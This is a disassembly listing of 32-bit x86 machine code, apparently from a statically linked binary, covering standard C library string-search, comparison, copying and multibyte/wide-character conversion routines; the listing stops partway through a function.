and ecx, 0x20
mov dword [esp], esi
lea eax, [edx - 1]
mov dword [var_10h], ecx
mov dword [var_sp_10h], 1
mov dword [var_sp_8h], eax
mov dword [var_sp_ch], 0xa
mov eax, dword [arg_8h]
mov dword [var_sp_4h], eax
call fcn.0808db00
test eax, eax
mov edi, eax
je 0x8076ccd
mov ebx, dword [esi]
test bl, 0x20
je 0x8076cc0
call fcn.08048b20
cmp dword [eax], 0xb
je 0x8076cc0
xor eax, eax
or ebx, dword [var_10h]
mov dword [esi], ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea esi, [esi]
mov ecx, dword [arg_8h]
mov byte [edi + ecx], 0
mov eax, ecx
mov ebx, dword [esi]
jmp 0x8076ca9
mov ebx, dword [esi]
jmp 0x8076ca7
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
test al, 3
je 0x8076d43
mov cl, byte [eax]
cmp dl, cl
je 0x8076e45
test cl, cl
je 0x8076e1a
inc eax
jmp 0x8076d43
lea esi, [esi]
add eax, 0x10
mov ecx, dword [eax]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e27
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e27
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 4]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e24
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e24
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 8]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e21
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e21
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1a
mov ecx, dword [eax + 0xc]
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1e
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8076e1e
xor ecx, edx
mov edi, 0xfefefeff
add edi, ecx
jae 0x8076e1a
xor edi, ecx
or edi, 0xfefefeff
inc edi
je 0x8076d40
xor eax, eax
pop edi
ret
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x8076e45
cmp cl, dl
je 0x8076e1a
inc eax
test ch, ch
je 0x8076e45
cmp ch, dl
je 0x8076e1a
inc eax
shr ecx, 0x10
test cl, cl
je 0x8076e45
cmp cl, dl
je 0x8076e1a
inc eax
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov ecx, dword [arg_4h]
mov edx, dword [arg_8h]
mov al, byte [ecx]
cmp al, byte [edx]
jne 0x8076e67
inc ecx
inc edx
test al, al
jne 0x8076e58
xor eax, eax
ret
mov eax, 1
mov ecx, 0xffffffff
cmovb eax, ecx
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08053400
lea ebx, [eax + 1]
mov dword [esp], ebx
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x8076eba
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], esi
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov eax, dword [arg_ch]
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [var_sp_4h], eax
mov dword [esp], esi
call fcn.08076f30
mov ebx, eax
lea eax, [eax + 1]
mov dword [esp], eax
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x8076f17
mov byte [ebx + eax], 0
mov dword [esp], eax
mov dword [var_sp_4h], esi
mov dword [var_sp_8h], ebx
call fcn.08053770
mov edx, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor edx, edx
mov ebp, esp
push esi
mov eax, dword [arg_ch]
mov esi, dword [arg_8h]
push ebx
test eax, eax
lea ebx, [eax + esi]
je 0x8076fae
cmp ebx, esi
mov eax, 0xffffffff
cmovb ebx, eax
test esi, 3
mov eax, esi
je 0x8076f62
cmp byte [eax], 0
je 0x8076fa5
inc eax
test al, 3
jne 0x8076f58
cmp eax, ebx
mov edx, eax
jae 0x8076fa5
mov eax, dword [edx]
add edx, 4
sub eax, 0x1010101
test eax, 0x80808080
je 0x8076f9f
cmp byte [edx - 4], 0
lea ecx, [edx - 4]
mov eax, ecx
je 0x8076fa5
cmp byte [ecx + 1], 0
lea eax, [edx - 3]
je 0x8076fa5
cmp byte [ecx + 2], 0
lea eax, [edx - 2]
je 0x8076fa5
cmp byte [ecx + 3], 0
lea eax, [edx - 1]
je 0x8076fa5
cmp edx, ebx
mov eax, ebx
jb 0x8076f68
cmp eax, ebx
mov edx, ebx
cmovbe edx, eax
sub edx, esi
pop ebx
pop esi
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov esi, dword [arg_10h]
push ebx
xor ebx, ebx
cmp esi, 3
jbe 0x807702e
mov edi, esi
shr edi, 2
lea esi, [esi]
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
dec edi
jne 0x8076fe0
and esi, 3
test esi, esi
je 0x8077047
movzx eax, byte [ecx]
inc ecx
mov ebx, eax
movzx eax, byte [edx]
inc edx
test bl, bl
je 0x8077047
cmp bl, al
jne 0x8077047
dec esi
jne 0x8077032
movzx edx, bl
movzx eax, al
pop ebx
pop esi
pop edi
sub edx, eax
mov eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
xor eax, eax
mov esi, dword [arg_ch]
mov ecx, dword [arg_10h]
mov ch, cl
mov edx, ecx
shl ecx, 0x10
mov cx, dx
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x807708a
mov eax, esi
or dl, dl
je 0x8077216
inc esi
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x80770a3
mov eax, esi
or dl, dl
je 0x8077216
inc esi
test esi, 3
je 0x8077103
mov dl, byte [esi]
cmp cl, dl
jne 0x80770bc
mov eax, esi
or dl, dl
je 0x8077216
inc esi
jmp 0x8077103
add byte [eax], al
add byte [ebx - 0x117cfb12], al
sub esi, 4
sub esi, 4
sub esi, 4
test edx, 0xff000000
jne 0x80770e9
lea eax, [esi + 0xf]
jmp 0x8077100
sub esi, 4
sub esi, 4
sub esi, 4
test edx, 0xff0000
jne 0x80770f6
lea eax, [esi + 0xe]
jmp 0x8077100
lea eax, [esi + 0xc]
test dh, dh
jne 0x8077100
lea eax, [esi + 0xd]
add esi, 0x10
mov edx, dword [esi]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771ec
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771ec
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770ca
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e0
mov edx, dword [esi + 4]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e9
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771e9
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770cd
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e3
mov edx, dword [esi + 8]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e6
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771e6
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770d0
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80770e6
mov edx, dword [esi + 0xc]
mov edi, 0xfefefeff
add edi, edx
jae 0x80771e3
xor edi, edx
or edi, 0xfefefeff
inc edi
jne 0x80771e3
xor edx, ecx
mov edi, 0xfefefeff
add edi, edx
jae 0x80770d3
xor edi, edx
or edi, 0xfefefeff
inc edi
je 0x8077100
jmp 0x80770e9
add esi, 4
add esi, 4
add esi, 4
cmp dl, cl
jne 0x80771f2
mov eax, esi
test dl, dl
je 0x8077216
cmp dh, cl
jne 0x80771fd
lea eax, [esi + 1]
test dh, dh
je 0x8077216
shr edx, 0x10
cmp dl, cl
jne 0x807720b
lea eax, [esi + 2]
test dl, dl
je 0x8077216
cmp dh, cl
jne 0x8077216
lea eax, [esi + 3]
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
push esi
push edi
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov esi, dword [arg_14h]
cmp esi, 4
jb 0x807737f
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
test al, 3
je 0x8077316
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
jmp 0x8077316
nop
lea esi, [esi]
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
mov ecx, dword [eax + 4]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a2
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a2
mov ecx, dword [eax + 8]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x807739f
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x807739f
mov ecx, dword [eax + 0xc]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x807739c
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x807739c
add eax, 0x10
sub esi, 0x10
jae 0x8077290
cmp esi, 0xfffffff4
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
cmp esi, 0xfffffff8
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
cmp esi, 0xfffffffc
jb 0x807737f
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x80773a5
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x80773a5
add eax, 4
and esi, 3
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
inc eax
dec esi
je 0x8077398
cmp byte [eax], dl
je 0x80773b8
xor eax, eax
jmp 0x80773b8
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x80773b8
inc eax
test ch, ch
je 0x80773b8
inc eax
test ecx, 0xff0000
je 0x80773b8
inc eax
pop edi
pop esi
ret
nop
nop
nop
nop
nop
mov eax, dword [arg_4h]
mov ecx, dword [arg_8h]
sub ecx, eax
sub eax, 4
add eax, 4
mov dl, byte [eax + ecx]
mov byte [eax], dl
test dl, dl
je 0x8077400
mov dl, byte [eax + ecx + 1]
mov byte [eax + 1], dl
test dl, dl
je 0x80773ff
mov dl, byte [eax + ecx + 2]
mov byte [eax + 2], dl
test dl, dl
je 0x80773fe
mov dl, byte [eax + ecx + 3]
mov byte [eax + 3], dl
test dl, dl
jne 0x80773d0
inc eax
inc eax
inc eax
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
test eax, eax
je 0x80774aa
mov dword [esp], 3
call section.
mov edx, eax
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
xor eax, eax
cmp edi, ecx
je 0x80774a2
movzx esi, byte [edi]
mov ebx, esi
movzx eax, bl
mov ebx, dword [edx + 0x38]
mov edx, dword [ebx + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [ebx + eax*4]
mov eax, edx
jne 0x80774a2
mov edx, esi
inc edi
test dl, dl
je 0x80774a2
movzx esi, byte [edi]
mov edx, esi
movzx eax, dl
mov edx, dword [ebx + eax*4]
movzx eax, byte [ecx]
inc ecx
sub edx, dword [ebx + eax*4]
mov eax, edx
je 0x8077485
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [0x80a9ab4]
jmp 0x8077460
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 4
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
test ebx, ebx
je 0x80774e7
mov dword [esp], esi
inc edi
call fcn.08053400
sub ebx, eax
lea esi, [eax + esi + 1]
dec ebx
jne 0x80774d5
add esp, 4
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
cmp esi, 1
ja 0x8077540
mov eax, dword [arg_14h]
mov dword [edi], 0
mov dword [eax], 0
xor edx, edx
add esp, 4
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
mov dword [esp], esi
call fcn.08050fe0
mov edx, 0xc
test eax, eax
mov dword [edi], eax
je 0x8077530
mov ecx, eax
movzx edx, byte [ebx]
movsx eax, dl
cmp eax, dword [arg_ch]
je 0x807758e
mov byte [ecx], dl
inc ecx
inc ebx
test dl, dl
jne 0x8077555
test esi, esi
je 0x8077573
mov eax, dword [arg_14h]
mov dword [eax], esi
jmp 0x807752e
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [arg_14h]
mov dword [edi], 0
mov dword [eax], 0
jmp 0x807756c
cmp ecx, dword [edi]
jbe 0x807759d
cmp byte [ecx - 1], 0
je 0x807759d
mov byte [ecx], 0
jmp 0x8077562
dec esi
jmp 0x8077563
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
test ebx, ebx
je 0x80775f3
mov dword [var_4h], ebx
mov dword [esp], esi
call fcn.08076f30
sub ebx, eax
add esi, eax
mov eax, ebx
dec ebx
cmp eax, 1
jbe 0x80775f3
movzx eax, byte [arg_10h]
mov byte [esi], al
inc esi
jmp 0x80775d2
add esp, 8
pop ebx
pop esi
leave
ret
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov ebx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [esp], ebx
call fcn.08053400
lea esi, [eax + 1]
cmp esi, 1
ja 0x807762b
xor edx, edx
add esp, 0xc
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_ch]
mov eax, dword [edx]
add eax, esi
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08051220
mov edx, 0xc
test eax, eax
mov dword [edi], eax
je 0x8077621
mov edx, dword [arg_ch]
mov edx, dword [edx]
mov dword [var_10h], edx
lea ecx, [edx + eax]
movzx edx, byte [ebx]
movsx eax, dl
cmp eax, dword [arg_14h]
je 0x8077675
mov byte [ecx], dl
inc ecx
inc ebx
test dl, dl
jne 0x8077656
mov eax, dword [var_10h]
mov edx, dword [arg_ch]
add eax, esi
mov dword [edx], eax
jmp 0x807761f
cmp ecx, dword [edi]
jbe 0x8077684
cmp byte [ecx - 1], 0
je 0x8077684
mov byte [ecx], 0
jmp 0x8077663
dec esi
jmp 0x8077664
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
mov edx, dword [arg_8h]
mov ecx, dword [edx]
test ecx, ecx
je 0x80776c0
mov esi, esi
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
je 0x80776c0
inc eax
mov ecx, dword [edx + eax*4]
test ecx, ecx
jne 0x80776a0
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [arg_10h]
mov edx, dword [arg_8h]
mov dword [esp], esi
mov dword [var_4h], edi
mov esi, dword [arg_ch]
cld
shl ecx, 2
mov edi, edx
mov eax, edx
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, dword [esp]
mov edi, dword [var_4h]
leave
ret
nop
nop
nop
nop
push ebp
mov ebp, esp
shl dword [arg_10h], 2
leave
jmp fcn.08053690
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x6c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
lea eax, [edi + 0x80]
cmp eax, 0x17f
ja 0x80778a8
cmp edi, 0xffffffff
je 0x80778a8
mov eax, 0
test eax, eax
je 0x807789e
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x807787e
mov esi, eax
cmp dword [esi + 4], 1
jne 0x80777c9
mov eax, dword [esi]
mov eax, dword [eax + 0x18]
test eax, eax
je 0x80777c9
mov dword [esp], eax
call fcn.08083520
mov ecx, edi
mov eax, dword [esi]
movzx edx, cl
mov dword [var_sp_4h], edx
mov edx, dword [esi]
mov dword [esp], edx
call dword [eax + 0x18]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea eax, [var_3dh]
mov dword [var_24h], 0
mov dword [var_20h], 0
mov dword [var_4ch], eax
mov dword [var_30h], 0
mov dword [var_2ch], 1
lea eax, [var_44h]
mov dword [var_34h], 1
mov dword [var_1ch], 0
mov dword [var_3ch], eax
lea ebx, [var_3ch]
lea eax, [var_40h]
mov dword [var_38h], eax
lea eax, [var_24h]
mov dword [var_28h], eax
mov eax, edi
mov byte [var_3dh], al
mov eax, dword [esi]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_48h]
mov edx, dword [esi]
mov dword [var_sp_4h], ebx
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
mov eax, dword [var_4ch]
mov dword [var_10h], 0
inc eax
mov dword [var_sp_ch], eax
lea eax, [var_4ch]
mov dword [var_sp_8h], eax
mov eax, dword [esi]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
mov edx, eax
je 0x8077876
cmp eax, 5
je 0x8077876
mov eax, 0xffffffff
cmp edx, 4
cmove eax, dword [var_44h]
mov dword [var_44h], eax
mov eax, dword [var_44h]
jmp 0x80777be
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077794
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077792
mov eax, dword [0x80a9ab4]
jmp 0x8077785
mov eax, 0xffffffff
jmp 0x80777be
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0x80aa9a4
mov ebp, esp
sub esp, 0x10
mov edx, dword [arg_10h]
mov dword [esp], 0
test edx, edx
cmovne eax, edx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
call fcn.08077900
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
lea ecx, [var_40h]
push ebx
sub esp, 0x60
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov eax, dword [arg_8h]
mov edx, dword [arg_14h]
mov dword [var_30h], 0
mov edi, dword [arg_ch]
mov dword [var_2ch], 1
test eax, eax
cmove eax, ecx
test edx, edx
mov dword [var_4ch], eax
mov eax, 0x80aa9ac
cmovne eax, edx
test edi, edi
mov dword [var_28h], eax
je 0x8077ab8
mov eax, dword [var_4ch]
mov dword [var_3ch], eax
add eax, 4
mov dword [var_38h], eax
mov eax, 0
test eax, eax
je 0x8077aae
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8077a8e
mov esi, eax
mov edx, dword [arg_10h]
mov eax, 0xffffffff
mov dword [var_48h], edi
lea ebx, [edx + edi]
cmp ebx, edi
cmovb ebx, eax
mov eax, dword [esi]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_44h]
mov edx, dword [esi]
mov dword [var_ch], ebx
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
lea eax, [var_48h]
mov dword [var_10h], 0
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
mov eax, dword [esi]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
jne 0x8077a2f
mov eax, dword [var_4ch]
cmp dword [var_3ch], eax
je 0x8077a28
mov edx, dword [eax]
test edx, edx
jne 0x8077a28
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8077a04
xor ebx, ebx
add esp, 0x60
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], str.__mbrtowc
mov dword [var_8h], 0x60
mov dword [var_4h], str.mbrtowc.c
mov dword [esp], str.__data.__statep_____count__0_
call fcn.0805efc0
mov ebx, dword [var_48h]
sub ebx, edi
jmp 0x80779fa
cmp eax, 4
jne 0x8077a5e
test eax, eax
je 0x80779e1
cmp eax, 4
je 0x80779e1
cmp eax, 5
je 0x80779e1
cmp eax, 7
mov ebx, 0xfffffffe
je 0x80779fa
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x80779fa
cmp eax, 6
je 0x8077a34
cmp eax, 7
je 0x8077a34
cmp eax, 5
je 0x8077a34
mov dword [var_ch], str.__mbrtowc
mov dword [var_8h], 0x57
mov dword [var_4h], str.mbrtowc.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
jmp 0x8077a23
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077982
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077980
mov eax, dword [0x80a9ab4]
jmp 0x8077973
mov dword [var_4ch], ecx
mov edi, 0x80a4f11
mov dword [arg_10h], 1
jmp 0x807794e
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, 0
sub esp, 0x5c
test ebx, ebx
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_48h], esp
je 0x8077d22
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x58]
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov dword [var_34h], 0
mov dword [var_30h], 1
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
mov eax, 0x80aa9b4
lea edx, [var_2fh]
and edx, 0xfffffff0
test esi, esi
cmovne eax, esi
test edi, edi
mov dword [var_2ch], eax
je 0x8077d14
test ebx, ebx
mov dword [var_3ch], edi
je 0x8077d0a
mov dword [esp], 3
call section.
mov eax, dword [eax]
test ebx, ebx
mov edx, dword [eax + 0x58]
lea eax, [edx + edi]
mov dword [var_3ch], eax
je 0x8077d00
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8077cde
mov esi, eax
mov eax, dword [var_8h]
test eax, eax
jne 0x8077c80
mov eax, dword [esi + 8]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_44h]
mov edx, dword [esi + 8]
mov dword [var_8h], 0
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 1
lea eax, [var_40h]
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_4h], eax
mov eax, dword [esi + 8]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
mov edx, eax
je 0x8077c6f
cmp eax, 4
je 0x8077c6f
nop
lea esi, [esi]
test edx, edx
jne 0x8077c36
mov ebx, dword [var_3ch]
sub ebx, edi
mov eax, ebx
mov esp, dword [var_48h_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
cmp edx, 4
jne 0x8077c5b
test edx, edx
je 0x8077c24
cmp edx, 4
je 0x8077c24
cmp edx, 5
je 0x8077c24
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x8077c29
cmp edx, 6
je 0x8077c3b
cmp edx, 7
je 0x8077c3b
cmp edx, 5
je 0x8077c3b
jmp 0x8077d2c
mov eax, dword [var_40h]
mov byte [eax], 0
inc dword [var_40h]
jmp 0x8077c20
lea esi, [esi]
lea eax, [var_ch]
mov dword [var_44h], eax
mov eax, dword [esi + 8]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_40h]
mov edx, dword [esi + 8]
mov dword [var_10h], 0
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
mov dword [var_14h], eax
mov eax, dword [var_44h]
add eax, 4
mov dword [var_ch], eax
lea eax, [var_44h]
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
mov eax, dword [esi + 8]
mov dword [esp], eax
call dword [edx + 0x14]
mov edx, eax
jmp 0x8077c20
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077bb5
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077bb3
mov esi, esi
mov eax, dword [0x80a9ab4]
jmp 0x8077ba6
mov eax, dword [0x80a9ab4]
jmp 0x8077b87
mov edi, edx
mov dword [var_ch], 0
jmp 0x8077b70
mov eax, dword [0x80a9ab4]
jmp 0x8077b2b
mov dword [var_ch], str.__wcrtomb
mov dword [var_8h], 0x62
mov dword [var_4h], str.wcrtomb.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x18
test eax, eax
mov dword [var_4h], ebx
mov ebx, dword [arg_14h]
je 0x8077dd1
mov dword [esp], 3
call section.
mov dword [var_10h], eax
